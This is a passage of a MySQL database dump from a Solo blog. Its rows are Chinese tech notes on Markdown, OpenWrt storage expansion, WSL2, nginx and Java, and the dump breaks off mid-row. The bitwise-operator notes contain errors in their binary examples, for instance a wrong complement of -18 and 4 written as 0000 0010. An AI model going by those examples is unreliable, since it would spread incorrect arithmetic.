-- MySQL dump 10.13  Distrib 5.6.49, for Linux (x86_64)
--
-- Host: 127.0.0.1    Database: solo
-- ------------------------------------------------------
-- Server version	5.6.49

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `b3_solo_archivedate`
--

DROP TABLE IF EXISTS `b3_solo_archivedate`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_archivedate` (
  `oId` varchar(19) NOT NULL COMMENT '主键',
  `archiveTime` bigint(20) NOT NULL COMMENT '存档日期时间，该月份第一天的时间戳',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='存档日期表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_archivedate`
--

LOCK TABLES `b3_solo_archivedate` WRITE;
/*!40000 ALTER TABLE `b3_solo_archivedate` DISABLE KEYS */;
INSERT INTO `b3_solo_archivedate` VALUES ('1584497886721',1582992000000),('1587524305946',1585670400000),('1590661424660',1588262400000),('1593141403919',1590940800000),('1596879620535',1596211200000),('1602479013820',1601481600000),('1604896685468',1604160000000),('1607688608765',1606752000000);
/*!40000 ALTER TABLE `b3_solo_archivedate` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `b3_solo_archivedate_article`
--

DROP TABLE IF EXISTS `b3_solo_archivedate_article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_archivedate_article` (
  `oId` varchar(19) NOT NULL COMMENT '主键',
  `archiveDate_oId` varchar(19) NOT NULL COMMENT '存档日期 id',
  `article_oId` varchar(19) NOT NULL COMMENT '文章 id',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='存档-文章关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_archivedate_article`
--

LOCK TABLES `b3_solo_archivedate_article` WRITE;
/*!40000 ALTER TABLE `b3_solo_archivedate_article` DISABLE KEYS */;
INSERT INTO `b3_solo_archivedate_article` VALUES ('1584513716754','1584497886721','1584513716588'),('1584513717049','1584497886721','1584513716894'),('1584513717474','1584497886721','1584513717316'),('1584513718771','1584497886721','1584513718665'),('1585557930956','1584497886721','1585557930801'),('1587524305998','1587524305946','1587524305793'),('1590661424712','1590661424660','1590661424556'),('1590754642517','1590661424660','1590754642414'),('1593141403970','1593141403919','1593141403765'),('1596879620586','1596879620535','1596879620431'),('1602479623866','1602479013820','1602479623711'),('1603520839343','1602479013820','1603520839239'),('1603858210254','1602479013820','1603858210093'),('1604897129452','1604896685468','1604897129295'),('1605714148803','1604896685468','1605714148649'),('1605959249742','1604896685468','1605959249638'),('1607688608816','1607688608765','1607688608609');
/*!40000 ALTER TABLE `b3_solo_archivedate_article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `b3_solo_article`
--

DROP TABLE IF EXISTS `b3_solo_article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `b3_solo_article` (
  `oId` varchar(19) NOT NULL COMMENT '主键',
  `articleTitle` varchar(255) NOT NULL COMMENT '文章标题',
  `articleAbstract` text NOT NULL COMMENT '文章摘要 Markdown',
  `articleAbstractText` text NOT NULL COMMENT '文章摘要纯文本',
  `articleTags` text NOT NULL COMMENT '文章标签，英文逗号分隔',
  `articleAuthorId` varchar(19) NOT NULL COMMENT '文章作者 id',
  `articleContent` mediumtext NOT NULL COMMENT '文章正文内容',
  `articlePermalink` varchar(255) NOT NULL COMMENT '文章访问路径',
  `articlePutTop` char(1) NOT NULL COMMENT '文章是否置顶',
  `articleCreated` bigint(20) NOT NULL COMMENT '文章创建时间戳',
  `articleUpdated` bigint(20) NOT NULL COMMENT '文章更新时间戳',
  `articleRandomDouble` double NOT NULL COMMENT '文章随机数，用于快速查询随机文章列表',
  `articleSignId` varchar(19) NOT NULL COMMENT '文章关联的签名档 id',
  `articleViewPwd` varchar(255) NOT NULL COMMENT '文章浏览密码，留空为不设置访问密码',
  `articleImg1URL` varchar(255) NOT NULL COMMENT '文章首图地址',
  `articleStatus` int(11) NOT NULL COMMENT '文章状态，0：已发布，1：草稿',
  PRIMARY KEY (`oId`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='文章表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `b3_solo_article`
--

LOCK TABLES `b3_solo_article` WRITE;
/*!40000 ALTER TABLE `b3_solo_article` DISABLE KEYS */;
INSERT INTO `b3_solo_article` VALUES ('1584513716588','Markdown基础语法','\n','什么是Markdown？  Markdown是一种轻量级纯文本格式的标记语言。  标题： 在想要设置为标题的文字前面加上 # 来表示，一个#表示一级标题，两个#表示二级标题，以此类推，最多支持六级标题。 # 一级标题 ## 二级标题 ### 三级标题 #### 四级标题 ##### 五级标题 ###### 六级标题  效果如下： 一级标题 二级标题 三级标题 四级标题 五级标题 六级标题 字体：  斜体  在需要倾斜的文字左右加上单 * 或者单个_ *这是倾斜字体* _这是斜体_  这是倾斜字体 这是斜体  加粗  在需要加粗的文字左右加上双 * 或者双_ **这是加粗字体** __这是加粗字体__  这是加粗字体 这是加粗字体  斜体加粗  在需要倾斜并加粗的文字左右加上三个 * 或者三个_ ***这是斜体加粗文字*** ___这是斜体加粗文字___  这是斜体加粗文字 这是斜体加粗文字  删除线  在需要添加删除线的文字左右分别加上 ~~ 表示 ~~这是需要添加删除线的文字~~  这是需要添加删除线的文字 引用： 在引用的文字前加上 &gt; 来表示。引用可以嵌套使用，只需在文字前....','Markdown','1584497886024','\n![](https://b3logfile.com/file/2020/05/20200121-75be921a.jpg)\n\n## 什么是Markdown？\n\n* Markdown是一种轻量级纯文本格式的标记语言。\n\n## 标题：\n\n在想要设置为标题的文字前面加上 # 来表示，一个#表示一级标题，两个#表示二级标题，以此类推，最多支持六级标题。\n\n```makefile\n# 一级标题\n## 二级标题\n### 三级标题\n#### 四级标题\n##### 五级标题\n###### 六级标题\n```\n\n效果如下：\n\n# 一级标题\n\n## 二级标题\n\n### 三级标题\n\n#### 四级标题\n\n##### 五级标题\n\n###### 六级标题\n\n## 字体：\n\n* 斜体\n\n在需要倾斜的文字左右加上单 * 或者单个_\n\n```makefile\n*这是倾斜字体*\n_这是斜体_\n```\n\n*这是倾斜字体*\n_这是斜体_\n\n* 加粗\n\n在需要加粗的文字左右加上双 * 或者双_\n\n```\n**这是加粗字体**\n__这是加粗字体__ \n```\n\n**这是加粗字体**\n__这是加粗字体__\n\n* 斜体加粗\n\n在需要倾斜并加粗的文字左右加上三个 * 或者三个_\n\n```\n***这是斜体加粗文字***\n___这是斜体加粗文字___\n```\n\n***这是斜体加粗文字***\n___这是斜体加粗文字___\n\n* 删除线\n\n在需要添加删除线的文字左右分别加上 ~~ 表示\n\n```\n~~这是需要添加删除线的文字~~\n```\n\n~~这是需要添加删除线的文字~~\n\n## 引用：\n\n在引用的文字前加上 > 来表示。引用可以嵌套使用，只需在文字前添加 N 个 > 符号即可。\n\n```\n>这是引用内容\n>>这是引用内容嵌套\n>>>这是引用内容嵌套\n>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>这是引用内容嵌套\n```\n\n## 分隔线：\n\n你可以在一行中使用三个或以上的星号、减号、底线来建立分隔线。\n\n```\n***\n**** \n---\n-----\n——————\n```\n\n---\n\n---\n\n---\n\n---\n\n## 下划线：\n\n下划线可以使用HTML中的 `<u>`标签实现。\n\n```\n<u>这是下划线字体</u>\n```\n\n<u>这是下划线字体</u>\n\n## 脚注：\n\n脚注是对文本的补充说明\n\n```\n文章主体内容[^这是注解文本]\n```\n\n```\n傻狗[^这是一种骂人的话]\n```\n\n## 列表\n\n列表有两种：一种是无序列表，一种是有序列表。\n\n### 无序列表：\n\n无序列表使用星号(*****)、加号(**+**)或是减号(**-**)作为列表标记：<font site=4 color=\"red\">【注意】:</font>该符号后面添加一个空格才能生效。\n\n```\n* 第一项\n* 第二项\n\n+ 第一项\n+ 第二项\n\n- 第一项\n- 第二项\n```\n\n* 第一项\n* 第二项\n\n+ 第一项\n+ 第二项\n\n- 第一项\n- 第二项\n\n### 有序列表：\n\n有序列表使用数字并加上 **.** 号来表示。<font site=4 color=\"red\">【注意】:</font>该符号后面添加一个空格才能生效。\n\n```\n1. 第一项\n2. 第二项\n3. 第三项\n```\n\n### 列表嵌套：\n\n列表嵌套只需在子列表中的选项添加**四个空格**或者直接按**TAB键**即可。<font site=4 color=\"red\">【注意】:</font>该符号后面添加一个空格才能生效。\n\n```\n1. 第一项\n	* 第二项\n```\n\n1. 第一项：\n   * 第二项\n\n## Markdown区块：\n\nMarkdown 区块引用是在段落开头使用 **>** 符号 ，然后后面紧跟一个**空格**符号：\n\n```\n> 这是一个代码块   //注意空格\n```\n\n> 这是一个区块\n\n区块中可以使用区块的**嵌套**以及**列表**。\n\n## Markdown代码：\n\n<font size=4 color=\"red\">单行代码:</font>代码之间分别用一个反引号包起来。\n\n`这是单行代码`\n\n<font size=4 color=\"red\">代码块:</font>代码之间分别用三个反引号包起来，且两边的反引号单独占一行。\n\n```\n~~~			// 注意单独一行\n这是\n一个代码块。\n~~~			// 注意单独一行\n```\n\n## Markdown链接:\n\n```\n[链接名称](链接地址) 或者 <链接地址>\n```\n\n[个人博客](http://www.goofiest.top)\n\n[http://www.goofiest.top](http://www.goofiest.top)\n\n## Markdown图片:\n\n```\n![图片alt](图片地址 \'\'图片title\'\')\n\n图片alt就是显示在图片下面的文字，相当于对图片内容的解释。\n图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加\n```\n\n## Markdown表格:\n\n```\n表头|表头|表头\n---|:--:|---:\n内容|内容|内容\n内容|内容|内容\n\n-: 设置内容和标题栏居右对齐。\n:- 设置内容和标题栏居左对齐。\n:-: 设置内容和标题栏居中对齐\n```\n\n```\n姓名|性别|年龄\n:--:|:--:|:--:\n张三|男|29\n李四|女|22\n王五|男|不详\n```\n\n| 姓名 | 性别 | 年龄 |\n| :-: | :-: | :-: |\n| 张三 | 男 | 29 |\n| 李四 | 女 | 22 |\n| 王五 | 男 | 不详 |\n','/articles/2020/03/15/1584265665162.html','0',1584265665000,1590402057843,0.9988322483616064,'1','','https://b3logfile.com/file/2020/05/20200121-75be921a.jpg?imageView2/1/w/1280/h/720/interlace/1/q/100',0),('1584513716894',' OpenWrt扩展rootfsk空间','\n','小米mini路由器刷潘多拉固件后下载软件包空间不足，所以只能扩展空间。（挂载时，我心态都炸了）下面给大家说一下挂载U盘来扩展空间。  将U盘格式化为ext-4格式。  root@Shanty:~# mkfs.ext4 /dev/sda1 #后续过程直接回车，使用默认值就行   将U盘挂载到mnt目录下，拷贝当前 / 和 /overlay 目录下的文件到U盘。  root@Shanty:~# mkdir /mnt/sda1 root@Shanty:~# mount /dev/sda1 /mnt/sda1 root@Shanty:~# tar -C /overlay -cvf - . | tar -C /mnt/sda1 -xf - root@Shanty:~# mkdir -p /tmp/cproot root@Shanty:~# mount --bind / /tmp/cproot root@Shanty:~# tar -C /tmp/cproot -cvf - . | tar -C /mnt/sda1 -x root@Shanty:~# umount /tmp/cproot   修改....','OpenWrt','1584497886024','小米mini路由器刷潘多拉固件后下载软件包空间不足，所以只能扩展空间。（挂载时，我心态都炸了）下面给大家说一下挂载U盘来扩展空间。\n\n1. 将U盘格式化为ext-4格式。\n\n```\nroot@Shanty:~# mkfs.ext4 /dev/sda1	  	#后续过程直接回车，使用默认值就行\n```\n\n2. 将U盘挂载到mnt目录下，拷贝当前 / 和 /overlay 目录下的文件到U盘。\n\n```\nroot@Shanty:~# mkdir /mnt/sda1\nroot@Shanty:~# mount /dev/sda1 /mnt/sda1\nroot@Shanty:~# tar -C /overlay -cvf - . | tar -C /mnt/sda1 -xf -\nroot@Shanty:~# mkdir -p /tmp/cproot\nroot@Shanty:~# mount --bind / /tmp/cproot\nroot@Shanty:~# tar -C /tmp/cproot -cvf - . | tar -C /mnt/sda1 -x\nroot@Shanty:~# umount /tmp/cproot\n```\n\n3. 修改fstab文件。\n\n```\nroot@Shanty:~# vi /etc/config/fstab\nconfig global\n        option anon_swap 0\n        option anon_mount 0\n        option auto_swap 1\n        option auto_mount 1\n        option delay_root 5\n        option check_fs 0\n\nconfig mount\n        option device /dev/sda1\n        option target /\n        option fstype ext4\n        option options rw,sync\n        option enabled_fsck 0\n        option enabled 1\n        option is_rootfs 1\n```\n\n4. 重启路由器，查看结果。\n\n```\n[root@PandoraBox_E553:/root]#df -h\nFilesystem                Size      Used Available Use% Mounted on\nrootfs                   13.7G     70.6M     12.9G   1% /\n/dev/root                 7.0M      7.0M         0 100% /rom\ntmpfs                    61.1M         0     61.1M   0% /sys/fs/cgroup\ntmpfs                    61.1M      1.1M     60.0M   2% /tmp\n/dev/sda1                13.7G     70.6M     12.9G   1% /\ntmpfs                   512.0K         0    512.0K   0% /dev\n```\n','/articles/2020/03/15/1584264904824.html','0',1584264904000,1584513851780,0.06950602711942178,'1','','https://img.hacpai.com/bing/20190906.jpg?imageView2/1/w/1280/h/720/interlace/1/q/100',0),('1584513717316','使用过Vmware后再使用wsl2闪退','\n','今天打开wsl2使用ubuntu-18.04发现出现闪退情况，尽管我重启电脑任然没有解决该问题。后来才发现是因为我前几天安装使用VMware的原因。解决闪退方法如下：  以管理员身份运行powershell 并执行以下命令：  wsl  此时回报错： 请启用虚拟机平台 Windows 功能并确保在 BIOS 中启用虚拟化。  由于我们在使用VMware时关闭了Hyper-v所以我们现在需要重新勾选Hyper-v  然后重启（可以放在后续一起执行）。 2. 勾选之后回到power shell中执行一下命令：  bcdedit /set hypervisorlaunchtype auto  3. 如果禁用了组策略里的Device Guard虚拟化安全设置，需要打开组策略管理。  本地计算机策略 &gt; 计算机配置 &gt; 管理模板&gt;系统 &gt; Device Guard 打开 基于虚拟化的安全设置为“已开启”或者“未设置”  然后重启电脑问题就解决啦！','win10','1584497886024','![](https://img.hacpai.com/bing/20191104.jpg?imageView2/1/w/960/h/540/interlace/1/q/100) \n\n今天打开wsl2使用ubuntu-18.04发现出现闪退情况，尽管我重启电脑任然没有解决该问题。后来才发现是因为我前几天安装使用VMware的原因。解决闪退方法如下：\n\n1. 以管理员身份运行powershell 并执行以下命令：\n\n```powershell\nwsl\n```\n\n此时回报错：\n\n```powershell\n请启用虚拟机平台 Windows 功能并确保在 BIOS 中启用虚拟化。\n```\n\n由于我们在使用VMware时关闭了Hyper-v所以我们现在需要重新勾选Hyper-v\n\n![](https://img2018.cnblogs.com/blog/1300898/201910/1300898-20191023161004291-1854963940.png)\n\n然后重启（可以放在后续一起执行）。\n\n```\n2. 勾选之后回到power shell中执行一下命令：\n```\n\n```powershell\nbcdedit /set hypervisorlaunchtype auto\n```\n\n```\n3. 如果禁用了组策略里的Device Guard虚拟化安全设置，需要打开组策略管理。\n```\n\n本地计算机策略 > 计算机配置 > 管理模板>系统 > Device Guard\n打开 基于虚拟化的安全设置为“已开启”或者“未设置”\n\n![](https://img2018.cnblogs.com/blog/1300898/201910/1300898-20191023161450713-1641906182.png)\n\n然后重启电脑问题就解决啦！\n','/articles/2020/03/15/1584513717316.html','0',1584265248000,1587550609475,0.9284164747134671,'1','','https://img.hacpai.com/bing/20191104.jpg?imageView2/1/w/960/h/540/interlace/1/q/100',0),('1584513718665','win10 wsl1 转换为wsl2 ','\n','win10的 wsl2 现在可以运行docker容器了，wsl1目前还不支持该功能，所以需要将wsl1升级为wsl2就可以了。下面就开介绍一下具体步骤吧！ 步骤如下:  启动\"虚拟机平台\"可选组件。 使用命令行对wsl1进行升级。    以管理员身份打开PowerShell并运行以下代码： Enable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform    运行改代码之后可重启电脑。   查看本地的WSL配置： wsl -l -v ### 输出结果 PS C:\\WINDOWS\\system32&gt; wsl -l -v NAME STATE VERSION * Ubuntu-18.04 Stopped 1    使用命令行将 WSL 1 的发行版转化为 WSL2、在 PowerShell 中运行：   wsl --set-version WSL的名字 2 //我的WSL名为 Ubuntu-18.04 ### 输出结果 正在进行转换，这可能需要几分钟时间... 有关与 WSL 2 的主要区别的信息，请....','win10','1584497886024','win10的 wsl2 现在可以运行docker容器了，wsl1目前还不支持该功能，所以需要将wsl1升级为wsl2就可以了。下面就开介绍一下具体步骤吧！\n\n<font size=\"4\" color=\"red\">步骤如下:</font>\n\n1. 启动\"虚拟机平台\"可选组件。\n2. 使用命令行对wsl1进行升级。\n\n---\n\n* 以<font color=\"red\">管理员身份</font>打开PowerShell并运行*以下代码*：\n  ```makefile\n  Enable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform\n  ```\n\n运行改代码之后可重启电脑。\n\n* 查看本地的WSL配置：\n  ```makefile\n  wsl -l -v\n\n  ### 输出结果\n  PS C:\\WINDOWS\\system32> wsl -l -v\n    NAME            STATE           VERSION\n  * Ubuntu-18.04    Stopped         1\n  ```\n\n\n\n* 使用命令行将 WSL 1 的发行版转化为 WSL2、在 PowerShell 中运行：\n\n```makefile\nwsl --set-version WSL的名字 2  	//我的WSL名为 Ubuntu-18.04 \n\n### 输出结果\n正在进行转换，这可能需要几分钟时间...\n有关与 WSL 2 的主要区别的信息，请访问 https://aka.ms/wsl2\n转换完成。\n```\n\n* 查看配置：\n\n```makefile\n wsl -l -v\n\n## 输出结果\n  NAME            STATE           VERSION\n* Ubuntu-18.04    Stopped         2\n```\n\n现在就可以正常使用了！\n','/articles/2020/03/15/1584264476231.html','0',1584264476000,1584513862458,0.9820871656054134,'1','','https://img.hacpai.com/bing/20190715.jpg?imageView2/1/w/1280/h/720/interlace/1/q/100',0),('1585557930801','nginx基础笔记','\n','代理： 正向代理：  在客户端（浏览器）配置代理服务器，通过代理服务器进行互联网访问。【注意】：正向代理所代理的对象是客户端。  nginx反向代理:  客户端将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据，在返回给客户端。【注意】：反向代理所代理的对象是服务器。  反向代理简单示例一： 通过访问www.goofiest.top自动跳转到www.goofiest.top:8080的地址。  反向代理简单示例二： 通过访问http://192.168.1.3:9001/:abc/ 直接跳转到 192.168.1.3:8080 通过访问http://192.168.1.3:9001/:ABC/ 直接跳转到 192.168.1.3:8081  【注意】端口需要开放！ 扩展： location 指令说明： （该指令用于匹配URL）   1、= ：用于不含正则表达式的 uri 前，要求请求字符串与 uri 严格匹配，如果匹配成功，就停止继续向下搜索并立即处理该请求。  2、~ : 用于表示 uri 包含正则表达式，并且区分大小写。  3、~* : 用于表示 uri 包含正则....','nginx','1584497886024','![20180309.jpg](https://b3logfile.com/file/2020/05/20180309-c822c5d3.jpg)\n\n# 代理：\n\n## 正向代理：\n\n 在客户端（浏览器）配置代理服务器，通过代理服务器进行互联网访问。【注意】：**正向代理所代理的对象是客户端。**\n![正向代理.png](https://img.hacpai.com/file/2020/03/正向代理-35480c56.png)\n\n\n\n## nginx反向代理:\n\n 客户端将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据，在返回给客户端。【注意】：**反向代理所代理的对象是服务器。**\n![反向代理.png](https://img.hacpai.com/file/2020/03/反向代理-16b0d57d.png)\n\n\n### 反向代理简单示例一：\n\n通过访问[www.goofiest.top](www.goofiest.top)自动跳转到[www.goofiest.top:8080](www.goofiest.top:8080)的地址。\n![1585282684072.png](https://img.hacpai.com/file/2020/03/1585282684072-7f38fe83.png)\n\n\n\n### 反向代理简单示例二：\n\n通过访问[http://192.168.1.3:9001/:abc/](http://192.168.1.3:9001/:abc/)	直接跳转到 192.168.1.3:8080\n\n通过访问[http://192.168.1.3:9001/:ABC/](http://192.168.1.3:9001/:ABC/)	直接跳转到 192.168.1.3:8081\n\n![1585401674878.png](https://img.hacpai.com/file/2020/03/1585401674878-1bf168ba.png)\n\n\n<font size=\'4\' color=red>【注意】</font>端口需要开放！\n\n扩展：\n\n<font fize=4 color=red>location 指令说明：</font> （该指令用于匹配URL）\n\n![1585402528743.png](https://img.hacpai.com/file/2020/03/1585402528743-5bfe2625.png)\n\n\n 1、= ：用于不含正则表达式的 uri 前，要求请求字符串与 uri 严格匹配，如果匹配成功，就停止继续向下搜索并立即处理该请求。\n\n 2、~ : 用于表示 uri 包含正则表达式，并且区分大小写。\n\n 3、~* : 用于表示 uri 包含正则表达式，并且不区分大小写。\n\n 3、^~ : 用于不包含正则表达式的 uri 前，要求 Nginx 服务器找到标识 uri 和请求字符串匹配度最高的 location 后，立即使用该 location 处理请求，而不再使用 location 块中的正则 uri 和请求字符串做匹配。\n\n注意：如果 uri 包含正则表达式，则必须要有 ~ 或者 ~* 标识。\n\n## 负载均衡：\n\n 负载均衡，是一种计算机技术，用来在多个计算机（计算机集群）、网络连接、CPU、磁盘驱动器或其他资源中分配负载，以达到最优化资源使用、最大化吞吐率、最小化响应时间、同时避免过载的目的。\n![负载均衡.png](https://img.hacpai.com/file/2020/03/负载均衡-5505fd94.png)\n\n\n### 负载均衡简单示例：\n\n通过访问[http://192.168.1.3/abc/a.html/](http://192.168.1.3/abc/a.html/) ，实现负载均衡，平均到 8080 和 8081 端口中。（该两个服务器中都有相同文件a.html）\n\n![1585405356706.png](https://img.hacpai.com/file/2020/03/1585405356706-78ebd8ad.png)\n\n\n**分配方式（策略）：**\n\n&ensp;1、轮询（默认）\n\n每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器宕机，能自动剔除。\n\n 2、weight\n\nweight 代表权，默认为1，权重越高被分配的客户端越多。\n\n![1585406220541.png](https://img.hacpai.com/file/2020/03/1585406220541-a0cdc52e.png)\n\n\n\n 3、ip_hash\n\n每个请求按访问 IP 的 hash 结果分配，这样每一个访客固定访问一个后端服务器，可以解决 session 的问题。\n\n![1585406462044.png](https://img.hacpai.com/file/2020/03/1585406462044-d834c338.png)\n\n\n 4、fair\n\n按后端服务器的响应时间来分配，响应时间短的优先分配。\n\n![1585406594470.png](https://img.hacpai.com/file/2020/03/1585406594470-c776eddb.png)\n\n\n## 动静分离：\n\n 为了加快服务器的解析速度，可以把动态网页和静态网页由不同的服务器来解析，加快解析的速度。降低原来单个服务器的压力。\n\n![动静分离.png](https://img.hacpai.com/file/2020/03/动静分离-1df256cf.png)\n\n','/articles/2020/03/30/1585557930801.html','0',1585557930904,1590398979880,0.9934009080548749,'1','','https://b3logfile.com/file/2020/05/20180309-c822c5d3.jpg?imageView2/1/w/1280/h/720/interlace/1/q/100',0),('1587524305793','位运算符笔记','\n','位运算符笔记 位运算符只能对整型。（byte , short , int , long , char）该运算符针对二进制码进行运算。 &lt;font size=4 color=red&gt; 原码：  数值直接计算出来的叫原码。注意最高位，又叫符号位，0代表正数；1代表负数。 &lt;font size=4 color=red&gt;反码：  除符号位之外，其它位都按位取反。 &lt;font size=4 color=red&gt;补码：  反码+1。 【注意】：负数的进制码，保存的的是补码。 1、&amp; ：按位与； 上下两位都是1时，得到的结果才是1. 2、| ：按位或 ； 上下有一位是1时，得到的结果就是1. /** * 位运算只能对整型运算。（byte , short , int , long , char）。针对二进制码进行运算。 * * &amp; ：按位与。上下两位都是1时，得到的结果才是1. * | ：按位或 。上下有一位是1时，得到的结果就是1. * * * */ public class 位运算符 { public static void main(Strin....','java','1584497886024','![](https://b3logfile.com/file/2020/05/20190524-1caa054e.jpg)\n\n# 位运算符笔记\n\n位运算符只能对整型。（byte , short , int , long , char）该运算符针对**二进制码**进行运算。\n\n```\n<font size=4 color=red> 原码：\n```\n\n</font>数值直接计算出来的叫原码。**注意**最高位，又叫符号位，0代表正数；1代表负数。\n\n```\n<font size=4 color=red>反码：\n```\n\n</font>除符号位之外，其它位都按位**取反**。\n\n```\n<font size=4 color=red>补码：\n```\n\n</font>反码+1。\n\n<font size =4 color= blue>【注意】：</font>负数的进制码，保存的的是补码。\n\n## 1、& ：按位与；\n\n上下两位都是1时，得到的结果才是1.\n\n## 2、| ：按位或 ；\n\n上下有一位是1时，得到的结果就是1.\n\n```java\n/**\n * 位运算只能对整型运算。（byte , short , int , long , char）。针对二进制码进行运算。\n * \n * & ：按位与。上下两位都是1时，得到的结果才是1.\n * | ：按位或 。上下有一位是1时，得到的结果就是1.\n * \n * \n * */\npublic class 位运算符 {\n	public static void main(String[] args) {\n	\n		System.out.println(23 & 12);\n		/*\n		 *  & ：按位与。上下两位都是1时，得到的结果才是1.\n		 *  \n		 * int 是32位。 1 2 4 8 16 32 64 128;\n		 * 0000 0000 0000 0000 0000 0000 0001 0111  23的原码。\n		 * 0000 0000 0000 0000 0000 0000 0000 1100  12的原码。\n		 * 0000 0000 0000 0000 0000 0000 0000 0100  23 & 12的原码。\n		 * */\n	\n		System.out.println(34 | 22);\n		/*\n		 * | ：按位或 。上下有一位是1时，得到的结果就是1.\n		 * 0000 0000 0000 0000 0000 0000 0010 0010  34的原码。\n		 * 0000 0000 0000 0000 0000 0000 0001 0110	22的原码。 \n		 * 0000 0000 0000 0000 0000 0000 0011 0110	34 | 22的原码。 54\n		 * */\n	\n		System.out.println(-18 | -32);\n	\n		/*\n		 * 1000 0000 0000 0000 0000 0000 0001 0010 	-18的原码\n		 * 1111 1111 1111 1111 1111 1111 1110 1011	-18的反码\n		 * 1111 1111 1111 1111 1111 1111 1110 1110	-18的补码\n		 * \n		 * 1000 0000 0000 0000 0000 0000 0010 0000	-32的原码\n		 * 1111 1111 1111 1111 1111 1111 1101 1111	-32的反码\n		 * 1111 1111 1111 1111 1111 1111 1110 0000	-32的补码\n		 * \n		 * 1111 1111 1111 1111 1111 1111 1110 1110  -18的补码 | -32的补码\n		 * 1111 1111 1111 1111 1111 1111 1110 1101	补码-1求出反码\n		 * 1000 0000 0000 0000 0000 0000 0001 0010	在取原码就是运算结果 \n		 * */\n	}\n\n}\n\n```\n\n## 3、~ ：非运算符（取反运算符）；\n\n如果位为0，结果是1，如果位为1，结果是0.\n\n运算规则：~1 = 0； ~0 =1；其实就是将二进制中的0变成1，1变成0.\n\n例子：~15；\n\n```java\n	15对应的二进制：0000 1111\n值  -16			 1111 0000\n```\n\n【注意】：二进制中，最高位是符号位，运算后符号会发生变化。\n\n## 4、^ ：异或运算符；\n\n上下两位相同结果是0，不同结果是1.\n\n例子：7^15\n\n```java\n 	7：   0000 0111\n  	 15： 0000 1111\n  结果：8：0000 1000\n```\n\n## 5、<< ：左移运算符；\n\n左移运算符就是把所有位向左移动几位。在二进制中左移N位，可以看作乘以2的N次方。\n\n例子：3<<2\n\n```java\n3的二进制：0000 0011\n3<<2    ：0000 1100\n可以看作3x2*2=3x4\n```\n\n## 6、>> : 右移运算符；\n\n右移运算符就是把所有位向右移动几位。在二进制中右移N位，可以看作除以2的N次方。\n\n例子 ： 4>>1\n\n```java\n4的二进制：0000 0010\n4>>1    : 0000 0001\n```\n\n【注意】：左移，右移过程中符号不发生改变。\n\n## 7、>>> ：无符号右移；\n\n在移动位的时候与右移运算符的移动方式一样的，区别只在于补位的时候不管是0还是1，都补0 。\n','/articles/2020/04/22/1587524305793.html','0',1587524305895,1590402029684,0.4838088567849955,'1','','https://b3logfile.com/file/2020/05/20190524-1caa054e.jpg?imageView2/1/w/1280/h/720/interlace/1/q/100',0),('1590661424556','Object的两个常用方法','\n','  Object 是一切类的父类。因此Java对象都可以调用 Object 类所提供的方法。 ▲ toString () 方法：  当你输入一个对象，或将一个对象与字符串进行拼接时—— Java默认调用该对象的 toString() 方法将该对象自动转成字符串。  很多时候，都会重写Object 的toString() 方法。toString() 方法也叫“自我描述”方法。 class Apples{ private String color; private double weight; public void setColor(String color) { this.color =color; } public String getColor() { return this.color; } public void setWeight(double weight) { this.weight = weight; } public double getWeight() { return this.weight; } public Apples() { System.out.prin....','java','1584497886024','![](https://img.hacpai.com/bing/20190910.jpg?imageView2/1/w/960/h/540/interlace/1/q/100)\n\n   Object 是一切类的父类。因此Java对象都可以调用 Object 类所提供的方法。\n\n### ▲ toString () 方法：\n\n 当你输入一个对象，或将一个对象与字符串进行拼接时—— Java默认调用该对象的 toString() 方法将该对象自动转成字符串。\n\n 很多时候，都会重写Object 的toString() 方法。toString() 方法也叫“自我描述”方法。\n\n```\nclass Apples{\nprivate String color;\nprivate double weight;\n\n\npublic void setColor(String color) {\n    this.color =color;\n}\n\npublic String getColor() {\n    return this.color;\n}\n\npublic void setWeight(double weight) {\n    this.weight = weight;\n}\n\npublic double getWeight() {\n    return this.weight;\n} \n\npublic Apples() {\n    System.out.println(\"还没熟\");\n}\n\npublic Apples(String color, double weight) {\n    this.color = color;\n    this.weight =weight;\n  \n}\n\n\n\n@Override\n// 重写toString方法\npublic String toString() {  // 基本格式比较固定\nreturn \"[color= \" + color + \" weight= \"+ weight + \" ]\";\n}\n\n}\n\npublic class 重写toString {\npublic static void main(String[] args) {\n\n\n    Apples sta1 = new 